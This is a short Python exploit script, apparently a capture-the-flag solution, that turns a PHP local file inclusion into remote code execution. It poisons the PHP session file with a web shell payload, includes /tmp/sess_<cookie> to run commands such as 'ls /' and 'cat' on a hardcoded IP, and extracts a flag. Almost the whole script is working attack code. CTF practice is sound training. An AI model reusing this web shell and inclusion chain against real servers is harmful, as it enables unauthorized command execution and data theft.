#!/usr/bin/python3
from requests import Session
from re import findall


def send_payload():
    s.get(url + "?karma=" + "<?php system($_GET['jadu']); ?>")


def payload(cookie, cmd=None):
    if cmd:
        return f"?karma=/tmp/sess_{cookie}&jadu={cmd}"
    else:
        return f"?karma=/tmp/sess_{cookie}"


s = Session()
# https://ctf.zeyu2001.com/2021/metactf-cybergames/custom-blog
# https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session

url = "http://44.200.237.73/"

r = s.get(url)

# get the location of the session file
cookie = r.cookies.get_dict()["PHPSESSID"]
# print(url + f"?karma=/tmp/sess_{cookie}")

r = s.get(url + payload(cookie))

# print(r.text)

send_payload()

r = s.get(url + payload(cookie, "ls /"))
# print(r.text)

file = findall("seCretJutsuToKillBorUtoKun.txt", r.text)[0]

if len(file) == 0:
    print("Oops something wrong no output found!!")
    exit(-1)

# s.get(url + "?karma=" + "<?php system($_GET['jadu']); ?>")
send_payload()

r = s.get(url + payload(cookie, f"cat /{file}"))

msg = r.text.split(":")[-1]
print(msg)

flag = findall("FLAG{.*}", msg)[-1]

print("\nFlag: " + flag)
